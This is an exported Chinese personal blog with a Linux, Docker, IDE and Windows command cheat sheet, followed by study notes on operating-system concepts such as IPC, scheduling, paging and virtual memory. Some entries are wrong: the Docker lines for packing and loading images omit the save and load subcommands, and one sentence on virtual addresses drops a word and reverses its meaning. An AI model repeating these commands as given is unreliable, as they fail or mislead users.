<h1 id="Centos-7"><a href="#Centos-7" class="headerlink" title="Centos 7"></a>Centos 7</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install man man-pages </span><br><span class="line">man 2 read</span><br><span class="line">tail -f out.11624</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /proc/$$/fd</span><br><span class="line">ll</span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line">yum install strace </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">forkfork output</span></span><br><span class="line">strace -ff -o out java SocketBIO</span><br><span class="line">nc localhost 9090</span><br><span class="line">exec 8&lt;&gt; /dev/tcp/www.baidu.com/80</span><br><span class="line">echo -e &quot;GET / HTTP/1.0\n&quot; &gt;&amp; 8</span><br><span class="line">cat 0&lt;&amp; 8</span><br><span class="line">curl www.baidu.com</span><br><span class="line">tcpdump -nn -i eth0 port 80</span><br><span class="line">tcpdump -nn -i eth0 arp or port 80</span><br><span class="line">route -n</span><br><span class="line">arp -d 10.211.55.1 &amp;&amp; curl www.baidu.com</span><br><span class="line">arp -a</span><br><span class="line">ifconfig lo:3. 192.168.88.88</span><br><span class="line">route add -host 192.168.88.88 gw 10.211.55.30</span><br><span class="line">find / -name &#x27;nginx&#x27;</span><br><span class="line">yum list installed | grep docker</span><br><span class="line">ifconfig</span><br><span class="line">touch</span><br><span class="line">vi</span><br><span class="line">mkdir leyou</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> -r和-f合写，-r表示递归地处理文件，即处理该目录及其所有子目录下符合条件的文件；-f则是无提示强制删除。</span></span><br><span class="line">rm -rf myzoo</span><br><span class="line">mv myzoo /var/www/myzoo</span><br><span class="line">pwd</span><br><span class="line">rm *</span><br><span class="line">whereis nginx</span><br><span class="line">systemctl reload apache2</span><br><span class="line">vi /etc/hosts</span><br><span class="line">cp -r myzoo /var/www</span><br><span class="line">kill -9 PID</span><br><span class="line">ps -ef|grep java</span><br><span class="line">netstat -apn|grep 5601</span><br><span class="line">netstat -natp</span><br><span class="line">ln -s /var/app/app/jar /etc/init.d/app</span><br><span class="line">chmod u+x app.jar</span><br><span class="line">service app start</span><br><span class="line"></span><br><span class="line">chkconfig servicename on/off</span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --add-port=4789/udp --permanent</span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">查看PATH：echo $PATH</span><br><span class="line"></span><br><span class="line">scp /home/888.zip 192.168.1.2:/home/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">top</span><br><span class="line">free -m:看内存占用</span><br><span class="line">df -h ：看硬盘占用率</span><br></pre></td></tr></table></figure>

<p>tar功能：文件的压缩或解压</p>
<p>语法：tar 命令</p>
<blockquote>
<p>-c 建立一个压缩文件的参数指令（create） –压缩<br>-x 解开一个压缩文件的参数指令（extract） –解压<br>-z 是否需要gzip压缩<br>-v 显示压缩的过程（verbose）<br>-f 使用档名，在f之后要立即接档名（file）</p>
</blockquote>
<p>压缩：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zcvf 文件名 压缩路径 </span><br></pre></td></tr></table></figure>

<p>解压：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf 文件名</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zcvf 文件名.tar.gz 要压缩文件路径</span><br></pre></td></tr></table></figure>

<p>解压缩</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf 要解压的文件.tar.gz </span><br></pre></td></tr></table></figure>

<p>这个命令是解压到当前文件夹</p>
<p>解压到指定目录中（该目录需要存在）需要添加-C参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf 要解压的文件.tar.gz -C 指定目录路径</span><br></pre></td></tr></table></figure>

<h2 id="vi-x2F-vim"><a href="#vi-x2F-vim" class="headerlink" title="vi&#x2F;vim"></a>vi&#x2F;vim</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> nu <span class="comment">#显示行号</span></span><br><span class="line">:<span class="built_in">set</span> nonu</span><br><span class="line"></span><br><span class="line">/bind.*6379 <span class="comment">#往下</span></span><br><span class="line">?<span class="built_in">bind</span>.*6379 <span class="comment">#往上</span></span><br><span class="line">n <span class="comment">#下一个</span></span><br><span class="line">N <span class="comment">#上一个</span></span><br><span class="line"></span><br><span class="line">x,X <span class="comment">#x向后删除一个字符,X向前删除一个字符</span></span><br><span class="line">ndd <span class="comment">#n为数字删除光标向下n行</span></span><br><span class="line">yy <span class="comment">#复制游标所在的那一行</span></span><br><span class="line">nyy <span class="comment">#n为数字复制游标所在的向下n行</span></span><br><span class="line">p,P <span class="comment">#p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！ 举例来说，我目前光标在第 20 行，且已经复制了 10 行数据。则按下 p 后， 那 10 行数据会贴在原本的 20 行之后，亦即由 21 行开始贴。但如果是按下 P 呢？ 那么原本的第 20 行会被推到变成 30 行。 (常用)</span></span><br><span class="line">u <span class="comment"># 复原上一个动作</span></span><br><span class="line">ctrl + r <span class="comment"># 重做上一个动作</span></span><br><span class="line">. <span class="comment">#不要怀疑！这就是小数点！意思是重复前一个动作的意思。 如果你想要重复删除、重复贴上等等动作，按下小数点『.』就好了！ (常用)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211845759.gif" alt="img"></p>
<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>退出dock容器: ctrl + D 或者输入exit</p>
<p>查看本地镜像: docker images</p>
<p>查看容器运行情况: docker ps</p>
<p>重启容器内的服务: docker restart nginx</p>
<p>查docker插件位置: docker volume inspect es-plugins</p>
<p>查看docker启动状态: systemctl status docker</p>
<p>启动docker服务: systemctl start docker</p>
<p>停止docker服务: systemctl stop docker</p>
<p>重启docker服务: systemctl restart docker</p>
<p>查看帮助: docker –help</p>
<p>加入开机自启: systemctl enable docker</p>
<p>显示所有容器包括停止的: docker ps -a</p>
<p>将多个镜像打包: docker -o xxx.tar 镜像1 镜像2</p>
<p>加载镜像: docker -i xxx.save.tar</p>
<h1 id="MACOS"><a href="#MACOS" class="headerlink" title="MACOS"></a>MACOS</h1><p>查ip：ifconfig | grep “inet “ | grep -v 127.0.0.1</p>
<p>显示隐藏文件夹: shift + command + .</p>
<p>切换桌面:control + 左和右和上和下</p>
<h2 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h2><p>跳出当前代码块：shift + command + enter </p>
<p>切换至上一个光标: option + command + 左右</p>
<p>重构: refactor</p>
<p>格式化代码: option + command + L</p>
<p>类和文件查询: shift + shift</p>
<p>全部内容查询: command + shift + R </p>
<p>当前文件查询: command + f</p>
<p>复制当前行: command + d</p>
<p>显示类的继承图: crtl + alt + U</p>
<p>调出idea寄存器保存的最近复制的N份内容,可选择性粘贴: shift + comamnd + v</p>
<p>补全当前行: shift+cmd + enter</p>
<p>将代码段封装成函数: option + command + m (按一次就默认生成,按两次为自定义生成)</p>
<p>for循环快捷方式: 100.for</p>
<p>快捷trycatch: option + command + T</p>
<p>if a &#x3D;&#x3D; null : a.null</p>
<p>if (flag) : flag.if</p>
<p>while (flag): flag.while</p>
<p>Rename: shift+fn+F6</p>
<p>插件</p>
<ul>
<li>一键生成set方法的插件：generateallsetter option+enter</li>
</ul>
<h2 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h2><p>开发者工具: Shift + F12</p>
<p>清除格式: command + \</p>
<p>跳出列表或者引用: caps lock + enter</p>
<p>跳出代码块: command + enter</p>
<p>源代码模式: command + &#x2F;</p>
<p>加入目录: [TOC]</p>
<p>文档树模式: control+ command +3</p>
<p>大纲模式: control + command + 1</p>
<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>切换虚拟桌面: win + Tab</p>
<p>新建虚拟桌面: win + ctrl + d</p>
<p>关闭虚拟桌面: win + ctrl + F4</p>
<p>显示桌面&#x2F;返回当前页面: win + d</p>
<p>打开文件资源管理器: win + e</p>
<p>打开设置: win + i</p>
<p>锁屏: win + L</p>
<p>打开运行窗口: win + r</p>
<p>快捷打印: win + p</p>
<p>任务切换: alt + tap</p>
<p>浏览器内窗口切换: ctrl + tap</p>
<p>关闭当前窗口: alt + f4 &#x2F; 双击窗口左上方</p>
<p>浏览器关闭当前活动窗口: ctrl + w</p>
<h3 id="idea-1"><a href="#idea-1" class="headerlink" title="idea"></a>idea</h3><table>
<thead>
<tr>
<th align="center">快捷键</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Ctrl + Y</td>
<td align="center">删除一行</td>
</tr>
<tr>
<td align="center">Ctrl + D</td>
<td align="center">复制一行</td>
</tr>
<tr>
<td align="center">Ctrl + Alt + L</td>
<td align="center">格式化</td>
</tr>
<tr>
<td align="center">Ctrl + Alt + O</td>
<td align="center">导包</td>
</tr>
<tr>
<td align="center">Alt+Insert（可修改）</td>
<td align="center">New菜单\代码生成菜单（生成getter和setter，maven依赖等）</td>
</tr>
<tr>
<td align="center">Ctrl + &#x2F;</td>
<td align="center">注释</td>
</tr>
<tr>
<td align="center">Ctrl + Shift + &#x2F;</td>
<td align="center">多行注释</td>
</tr>
<tr>
<td align="center">Ctrl + Alt + 左&#x2F;右</td>
<td align="center">回退到上一次操作的地方，等于eclipse中的 Alt+左&#x2F;右</td>
</tr>
<tr>
<td align="center">Shift + Alt + 上&#x2F;下</td>
<td align="center">将代码上移或下移一行</td>
</tr>
</tbody></table>
<p>Ctrl + H ：罗列类的继承关系</p>
<p>连按两次shift，全局搜索</p>
<h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><p>查看端口: netstat -ano</p>
<p>查看具体端口占用情况: netstat -aon|findstr “49157”</p>
<p>查进程名称: tasklist |findstr “进程id号”</p>
<p>查看会话: netstat -n</p>
<p>查看服务: msconfig</p>
<p>杀进程: tskill pid</p>
<p>杀进程: taskkill &#x2F;f &#x2F;t &#x2F;im “进程id或者进程名称”</p>
]]></content>
      <categories>
        <category>常用命令</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>centos</tag>
        <tag>docker</tag>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统</title>
    <url>/2022/03/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%89%AF%E6%9C%AC/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><p>30天自制操作系统</p>
<p>Linux内核设计与实现</p>
<p>UMA ：Uniform memory access</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848308.png" alt="image-20210605203758287"></p>
<p>NUMA： Non Uniform Memory Access</p>
<p>分配内存会优先分配离该线程最近的内存</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848396.png" alt="image-20210605203834153"></p>
<h2 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848739.png" alt="image-20210423163941164"></p>
<p>通电- bios（basic input output system） uefi 工作- 自检 - 到硬盘固定位置加载bootloader - 读取可配置信息- CMOS</p>
<p>bootloader的位置是写死了，不然bios找不到，bios是写死的，改不了。</p>
<p> CMOS是用来记录配置信息（开机密码），主办有块电池给他供电，忘了密码可以把它的电池扣下来，密码就重置了。</p>
<h2 id="操作系统基础"><a href="#操作系统基础" class="headerlink" title="操作系统基础"></a>操作系统基础</h2><h3 id="什么是操作系统？"><a href="#什么是操作系统？" class="headerlink" title="什么是操作系统？"></a>什么是操作系统？</h3><ol>
<li><strong>操作系统（Operating System，简称 OS）是管理计算机硬件与软件资源的程序，是计算机的基石。</strong></li>
<li><strong>操作系统本质上是一个运行在计算机上的软件程序 ，用于管理计算机硬件和软件资源。</strong> 举例：运行在你电脑上的所有应用程序都通过操作系统来调用系统内存以及磁盘等等硬件。</li>
<li><strong>操作系统存在屏蔽了硬件层的复杂性。</strong> 操作系统就像是硬件使用的负责人，统筹着各种相关事项。</li>
<li><strong>操作系统的内核（Kernel）是操作系统的核心部分，它负责系统的内存管理，硬件设备的管理，文件系统的管理以及应用程序的管理</strong>。 内核是连接应用程序和硬件的桥梁，决定着系统的性能和稳定性。</li>
</ol>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>根据进程访问资源的特点，可以把进程在系统上的运行分为两个级别：</p>
<ol>
<li>用户态(user mode) : 用户态运行的进程可以直接读取用户程序的数据。</li>
<li>系统态(kernel mode):可以简单的理解系统态运行的进程或程序几乎可以访问计算机的任何资源，不受限制。</li>
</ol>
<p>凡是与系统态级别的资源有关的操作（如文件管理、进程控制、内存管理等)，都必须通过系统调用方式向操作系统提出服务请求，并由操作系统代为完成。</p>
<p>这些系统调用按功能大致可分为如下几类：</p>
<ul>
<li>设备管理。完成设备的请求或释放，以及设备启动等功能。</li>
<li>文件管理。完成文件的读、写、创建及删除等功能。</li>
<li>进程控制。完成进程的创建、撤销、阻塞及唤醒等功能。</li>
<li>进程通信。完成进程之间的消息传递或信号传递等功能。</li>
<li>内存管理。完成内存的分配、回收以及获取作业占用内存区大小及地址等功能。</li>
</ul>
<h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><h3 id="进程和线程的区别"><a href="#进程和线程的区别" class="headerlink" title="进程和线程的区别"></a>进程和线程的区别</h3><blockquote>
<p>如果你对Java内存区域 (运行时数据区) 这部分知识不太了解的话可以阅读一下这篇文章：<a href="https://snailclimb.gitee.io/javaguide/#/docs/java/jvm/Java%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F">《可能是把 Java 内存区域讲的最清楚的一篇文章》</a></p>
</blockquote>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848734.png" alt="img"></p>
<p>从上图可以看出：一个进程中可以有多个线程，多个线程共享进程的堆和方法区 （JDK1.8 之后的元空间）资源，但是每个线程有自己的程序计数器、虚拟机栈和本地方法栈。</p>
<p>总结： 线程是进程划分成的更小的运行单位，一个进程在其执行的过程中可以产生多个线程。线程和进程最大的不同在于基本上各进程是独立的，而各线程则不一定，因为同一进程中的线程极有可能会相互影响。线程执行开销小，但不利于资源的管理和保护；而进程正相反。</p>
<h3 id="进程有哪几种状态"><a href="#进程有哪几种状态" class="headerlink" title="进程有哪几种状态?"></a>进程有哪几种状态?</h3><ul>
<li>创建状态（new） ：进程正在被创建，尚未到就绪状态。</li>
<li>就绪状态（ready） ：进程已处于准备运行状态，即进程获得了除了处理器之外的一切所需资源，一旦得到处理器资源（处理器分配的时间片）即可运行。</li>
<li>运行状态（running） ：进程正在处理器上上运行（单核 CPU 下任意时刻只有一个进程处于运行状态）。</li>
<li>阻塞状态（waiting） ：又称为等待状态，进程正在等待某一事件而暂停运行如等待某资源为可用或等待 IO 操作完成。即使处理器空闲，该进程也不能运行。</li>
<li>结束状态（terminated） ：进程正在从系统中消失。可能是进程正常结束或其他原因中断退出运行。</li>
</ul>
<h3 id="进程通信方式"><a href="#进程通信方式" class="headerlink" title="进程通信方式"></a>进程通信方式</h3><blockquote>
<p><a href="https://www.jianshu.com/p/c1015f5ffa74">《进程间通信 IPC (InterProcess Communication)》</a> </p>
</blockquote>
<ol>
<li>管道&#x2F;匿名管道（Pipes） ：用于具有亲缘关系的父子进程间或者兄弟进程之间的通信。</li>
<li>有名管道（Names Pipes） : 匿名管道由于没有名字，只能用于亲缘关系的进程间通信。为了克服这个缺点，提出了有名管道。有名管道严格遵循先进先出(first in first out)。有名管道以磁盘文件的方式存在，可以实现本机任意两个进程通信。</li>
<li>信号（Signal） ：信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生。</li>
<li>消息队列（Message Queuing） ：消息队列是消息的链表，具有特定的格式，存放在内存中并由消息队列标识符标识。管道和消息队列的通信数据都是先进先出的原则。与管道（无名管道：只存在于内存中的文件；命名管道：存在于实际的磁盘介质或者文件系统）不同的是消息队列存放在内核中，只有在内核重启（即，操作系统重启）或者显示地删除一个消息队列时，该消息队列才会被真正的删除。消息队列可以实现消息的随机查询，消息不一定要以先进先出的次序读取，也可以按消息的类型读取。比 FIFO 更有优势。消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺点。</li>
<li>信号量（Semaphores）：信号量是一个计数器，用于多进程对共享数据的访问，信号量的意图在于进程间同步。这种通信方式主要用于解决与同步相关的问题并避免竞争条件。</li>
<li>共享内存（Shared memory）：使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据的更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等。这是最有用的进程间通信方式。</li>
<li>套接字（Sockets）： 此方法主要用于在客户端和服务器之间通过网络进行通信。套接字是支持 TCP&#x2F;IP 的网络通信的基本操作单元，可以看做是不同主机之间的进程进行双向通信的端点，简单的说就是通信的两方的一种约定，用套接字中的相关函数来完成通信过程。</li>
</ol>
<h3 id="线程同步方式"><a href="#线程同步方式" class="headerlink" title="线程同步方式"></a>线程同步方式</h3><p>线程同步是两个或多个共享关键资源的线程的并发执行。应该同步线程以避免关键的资源使用冲突。操作系统一般有下面三种线程同步的方式：</p>
<ol>
<li>互斥量（Mutex）：采用互斥对象机制，只有拥有互斥对象的线程才有访问公共资源的权限。因为互斥对象只有一个，所以可以保证公共资源不会被多个线程同时访问。比如 Java 中的 synchronized 关键词和各种 Lock 都是这种机制。</li>
<li>信号量（Semphares） ：它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量</li>
<li>事件（Event） ：Wait&#x2F;Notify，通过通知操作的方式来保持多线程同步，还可以方便的实现多线程优先级的比较操作。</li>
</ol>
<h3 id="进程的调度算法"><a href="#进程的调度算法" class="headerlink" title="进程的调度算法"></a>进程的调度算法</h3><ul>
<li>先到先服务（FCFS）调度算法 ：从就绪队列中选择一个最先进入该队列的进程为之分配资源，使它立即执行并一直执行到完成或发生某事件而被阻塞放弃占用 CPU 时再重新调度。</li>
<li>短作业优先（SJF）调度算法 ：从就绪队列中选出一个估计运行时间最短的进程为之分配资源，使它立即执行并一直执行到完成或发生某事件而被阻塞放弃占用 CPU 时再重新调度。</li>
<li>时间片轮转（RR）调度算法 : 时间片轮转调度是一种最古老，最简单，最公平且使用最广的算法，又称 RR(Round robin)调度。每个进程被分配一个时间段，称作它的时间片，即该进程允许运行的时间。</li>
<li>多级反馈队列调度算法 ：前面几种进程调度的算法都有一定的局限性。如短进程优先的调度算法，仅照顾了短进程而忽略了长进程 。多级反馈队列调度算法既能使高优先级的作业得到响应又能使短作业（进程）迅速完成。因而它是目前被公认的一种较好的进程调度算法，UNIX 操作系统采取的便是这种调度算法。</li>
<li>优先级调度 ： 为每个流程分配优先级，首先执行具有最高优先级的进程，依此类推。具有相同优先级的进程以 FCFS 方式执行。可以根据内存要求，时间要求或任何其他资源要求来确定优先级。</li>
</ul>
<h2 id="操作系统内存管理基础"><a href="#操作系统内存管理基础" class="headerlink" title="操作系统内存管理基础"></a>操作系统内存管理基础</h2><h3 id="内存管理介绍"><a href="#内存管理介绍" class="headerlink" title="内存管理介绍"></a>内存管理介绍</h3><p>操作系统的内存管理主要负责内存的分配与回收（malloc 函数：申请内存，free 函数：释放内存），另外地址转换也就是将逻辑地址转换成相应的物理地址等功能也是操作系统内存管理做的事情。</p>
<h3 id="常见的几种内存管理机制"><a href="#常见的几种内存管理机制" class="headerlink" title="常见的几种内存管理机制"></a>常见的几种内存管理机制</h3><p>简单分为连续分配管理方式和非连续分配管理方式这两种。连续分配管理方式是指为一个用户程序分配一个连续的内存空间，常见的如块式管理 。同样地，非连续分配管理方式允许一个程序使用的内存分布在离散或者说不相邻的内存中，常见的如页式管理和段式管理。</p>
<ol>
<li><p>块式管理 ： 远古时代的计算机操系统的内存管理方式。将内存分为几个固定大小的块，每个块中只包含一个进程。如果程序运行需要内存的话，操作系统就分配给它一块，如果程序运行只需要很小的空间的话，分配的这块内存很大一部分几乎被浪费了。这些在每个块中未被利用的空间，称为内部碎片。</p>
</li>
<li><p>页式管理 ：把主存分为大小相等且固定的一页一页的形式，页较小，相比于块式管理的划分力度更大，提高了内存利用率，减少了内部碎片。页式管理通过页表对应逻辑地址和物理地址。</p>
</li>
<li><p>段式管理 ： 页式管理虽然提高了内存利用率，但是页式管理其中的页实际并无任何实际意义。 段式管理把主存分为一段段的。但是，段是有实际意义的，每个段定义了一组逻辑信息。例如，有主程序段 MAIN、子程序段 X、数据段 D 及栈段 S 等。 段式管理通过段表对应逻辑地址和物理地址。</p>
</li>
<li><p>段页式管理机制 ：段页式管理机制结合了段式管理和页式管理的优点。简单来说段页式管理机制就是把主存先分成若干段，每个段又分成若干页，也就是说段页式管理机制中段与段之间以及段的内部的都是离散的。</p>
</li>
</ol>
<h3 id="快表和多级页表"><a href="#快表和多级页表" class="headerlink" title="快表和多级页表"></a>快表和多级页表</h3><ol>
<li>虚拟地址到物理地址的转换要快。</li>
<li>解决虚拟地址空间大，页表也会很大的问题。</li>
</ol>
<h4 id="快表"><a href="#快表" class="headerlink" title="快表"></a>快表</h4><p>为了解决虚拟地址到物理地址的转换速度，操作系统在页表方案基础之上引入了快表来加速虚拟地址到物理地址的转换。可以把快表理解为一种特殊的高速缓冲存储器（Cache），其中的内容是页表的一部分或者全部内容。作为页表的 Cache，它的作用与页表相似，但是提高了访问速率。由于采用页表做地址转换，读写内存数据时CPU要访问两次主存。有了快表，有时只要访问一次高速缓冲存储器，一次主存，这样可加速查找并提高指令执行速度。</p>
<p>使用快表之后的地址转换流程是这样的：</p>
<ol>
<li>根据虚拟地址中的页号查快表；</li>
<li>如果该页在快表中，直接从快表中读取相应的物理地址；</li>
<li>如果该页不在快表中，就访问内存中的页表，再从页表中得到物理地址，同时将页表中的该映射表项添加到快表中；</li>
<li>当快表填满后，又要登记新页时，就按照一定的淘汰策略淘汰掉快表中的一个页。</li>
</ol>
<h4 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h4><p>引入多级页表的主要目的是为了避免把全部页表一直放在内存中占用过多空间，特别是那些根本就不需要的页表就不需要保留在内存中。多级页表属于时间换空间的典型场景：</p>
<ul>
<li>多级页表如何节约内存：<a href="https://www.polarxiong.com/archives/%E5%A4%9A%E7%BA%A7%E9%A1%B5%E8%A1%A8%E5%A6%82%E4%BD%95%E8%8A%82%E7%BA%A6%E5%86%85%E5%AD%98.html">https://www.polarxiong.com/archives/多级页表如何节约内存.html</a></li>
</ul>
<h3 id="分页机制和分段机制的共同点和区别"><a href="#分页机制和分段机制的共同点和区别" class="headerlink" title="分页机制和分段机制的共同点和区别"></a>分页机制和分段机制的共同点和区别</h3><ol>
<li>共同点<ul>
<li>分页机制和分段机制都是为了提高内存利用率，较少内存碎片。</li>
<li>页和段都是离散存储的，所以两者都是离散分配内存的方式。但是，每个页和段中的内存是连续的。</li>
</ul>
</li>
<li>区别<ul>
<li>页的大小是固定的，由操作系统决定；而段的大小不固定，取决于当前运行的程序。</li>
<li>分页仅仅是为了满足操作系统内存管理的需求，而段是逻辑信息的单位，在程序中可以体现为代码段，数据段，能够更好满足用户的需要。</li>
</ul>
</li>
</ol>
<h3 id="逻辑-虚拟-地址和物理地址"><a href="#逻辑-虚拟-地址和物理地址" class="headerlink" title="逻辑(虚拟)地址和物理地址"></a>逻辑(虚拟)地址和物理地址</h3><p>编程一般只有可能和逻辑地址打交道，比如在 C 语言中，指针里面存储的数值就可以理解成为内存里的一个地址，这个地址也就是逻辑地址，逻辑地址由操作系统决定。物理地址指的是真实物理内存中的地址，更具体一点来说就是内存地址寄存器中的地址。物理地址是内存单元真正的地址。</p>
<h3 id="CPU-寻址了解吗-为什么需要虚拟地址空间"><a href="#CPU-寻址了解吗-为什么需要虚拟地址空间" class="headerlink" title="CPU 寻址了解吗?为什么需要虚拟地址空间?"></a>CPU 寻址了解吗?为什么需要虚拟地址空间?</h3><p>现代处理器使用的是一种称为虚拟寻址（Virtual Addressing）的寻址方式。使用虚拟寻址，CPU 需要将虚拟地址翻译成物理地址，这样才能访问到真实的物理内存。 实际上完成虚拟地址转换为物理地址转换的硬件是 CPU 中含有一个被称为 内存管理单元（Memory Management Unit, MMU） 的硬件。如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848062.png" alt="MMU_principle_updated"></p>
<p><strong>为什么要有虚拟地址空间呢？</strong></p>
<p>虚拟地址空间的时候，<strong>程序都是直接访问和操作的都是物理内存</strong> 。但是这样有什么问题呢？</p>
<ol>
<li>用户程序可以访问任意内存，寻址内存的每个字节，这样就很容易（有意或者无意）破坏操作系统，造成操作系统崩溃。</li>
<li>想要同时运行多个程序特别困难，比如你想同时运行一个微信和一个 QQ 音乐都不行。为什么呢？举个简单的例子：微信在运行的时候给内存地址 1xxx 赋值后，QQ 音乐也同样给内存地址 1xxx 赋值，那么 QQ 音乐对内存的赋值就会覆盖微信之前所赋的值，这就造成了微信这个程序就会崩溃。</li>
</ol>
<p>总结来说：如果直接把物理地址暴露出来的话会带来严重问题，比如可能对操作系统造成伤害以及给同时运行多个程序造成困难。</p>
<p>通过虚拟地址访问内存有以下优势：</p>
<ul>
<li>程序可以使用一系列相邻的虚拟地址来访问物理内存中不相邻的大内存缓冲区。</li>
<li>程序可以使用一系列虚拟地址来访问大于可用物理内存的内存缓冲区。当物理内存的供应量变小时，内存管理器会将物理内存页（通常大小为 4 KB）保存到磁盘文件。数据或代码页会根据需要在物理内存与磁盘之间移动。</li>
<li>不同进程使用的虚拟地址彼此隔离。一个进程中的代码无法更改正在由另一进程或操作系统使用的物理内存。</li>
</ul>
<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><h3 id="什么是虚拟内存-Virtual-Memory"><a href="#什么是虚拟内存-Virtual-Memory" class="headerlink" title="什么是虚拟内存(Virtual Memory)?"></a>什么是虚拟内存(Virtual Memory)?</h3><p>这个在我们平时使用电脑特别是 Windows 系统的时候太常见了。很多时候我们使用点开了很多占内存的软件，这些软件占用的内存可能已经远远超出了我们电脑本身具有的物理内存。 正是因为虚拟内存的存在，通过虚拟内存可以让程序拥有超过系统物理内存大小的可用内存空间。另外，虚拟内存为每个进程提供了一个一致的、私有的地址空间，它让每个进程产生了一种自己在独享主存的错觉（每个进程拥有一片连续完整的内存空间）。这样会更加有效地管理内存并减少出错。</p>
<p>虚拟内存是计算机系统内存管理的一种技术，我们可以手动设置自己电脑的虚拟内存。不要单纯认为虚拟内存只是“使用硬盘空间来扩展内存“的技术。虚拟内存的重要意义是它定义了一个连续的虚拟地址空间，并且把内存扩展到硬盘空间。推荐阅读：《虚拟内存的那点事儿》</p>
<p>维基百科中有几句话是这样介绍虚拟内存的。</p>
<blockquote>
<p><strong>虚拟内存</strong> 使得应用程序认为它拥有连续的可用的内存（一个连续完整的地址空间），而实际上，它通常是被分隔成多个物理内存碎片，还有部分暂时存储在外部磁盘存储器上，在需要时进行数据交换。与没有使用虚拟内存技术的系统相比，使用这种技术的系统使得大型程序的编写变得更容易，对真正的物理内存（例如 RAM）的使用也更有效率。目前，大多数操作系统都使用了虚拟内存，如 Windows 家族的“虚拟内存”；Linux 的“交换空间”等。</p>
</blockquote>
<h3 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h3><p>局部性原理是虚拟内存技术的基础，正是因为程序运行具有局部性原理，才可以只装入部分程序到内存就开始运行。</p>
<p>局部性原理表现在以下两个方面：</p>
<ol>
<li>时间局部性 ：如果程序中的某条指令一旦执行，不久以后该指令可能再次执行；如果某数据被访问过，不久以后该数据可能再次被访问。产生时间局部性的典型原因，是由于在程序中存在着大量的循环操作。</li>
<li>空间局部性 ：一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也将被访问，即程序在一段时间内所访问的地址，可能集中在一定的范围之内，这是因为指令通常是顺序存放、顺序执行的，数据也一般是以向量、数组、表等形式簇聚存储的。</li>
</ol>
<p>时间局部性是通过将近来使用的指令和数据保存到高速缓存存储器中，并使用高速缓存的层次结构实现。空间局部性通常是使用较大的高速缓存，并将预取机制集成到高速缓存控制逻辑中实现。虚拟内存技术实际上就是建立了 “内存一外存”的两级存储器的结构，利用局部性原理实现髙速缓存。</p>
<h3 id="虚拟存储器"><a href="#虚拟存储器" class="headerlink" title="虚拟存储器"></a>虚拟存储器</h3><blockquote>
<p>勘误：虚拟存储器又叫做虚拟内存，都是 Virtual Memory 的翻译，属于同一个概念。</p>
</blockquote>
<p>基于局部性原理，在程序装入时，可以将程序的一部分装入内存，而将其他部分留在外存，就可以启动程序执行。由于外存往往比内存大很多，所以我们运行的软件的内存大小实际上是可以比计算机系统实际的内存大小大的。在程序执行过程中，当所访问的信息不在内存时，由操作系统将所需要的部分调入内存，然后继续执行程序。另一方面，操作系统将内存中暂时不使用的内容换到外存上，从而腾出空间存放将要调入内存的信息。这样，计算机好像为用户提供了一个比实际内存大的多的存储器——虚拟存储器。</p>
<p>实际上，我觉得虚拟内存同样是一种时间换空间的策略，你用 CPU 的计算时间，页的调入调出花费的时间，换来了一个虚拟的更大的空间来支持程序的运行。程序世界几乎不是时间换空间就是空间换时间。</p>
